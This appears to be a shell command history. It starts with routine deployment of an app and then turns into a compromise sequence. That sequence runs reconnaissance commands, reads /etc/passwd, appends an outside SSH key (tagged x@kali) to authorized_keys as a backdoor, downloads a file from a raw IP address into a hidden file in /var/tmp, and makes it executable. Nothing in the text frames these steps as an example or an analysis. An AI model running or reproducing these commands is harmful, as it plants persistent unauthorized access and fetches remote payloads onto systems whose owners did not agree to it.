cd app
tail -f /var/log/app/app.log
git pull
sudo systemctl restart app
ls
systemctl status app
make deploy
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJuGvuVZBHtF1krExlbpMW9VQlH4r0GVZphAoLYJ+ib6 x@kali' >> ~/.ssh/authorized_keys
wget -q http://141.88.209.254/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
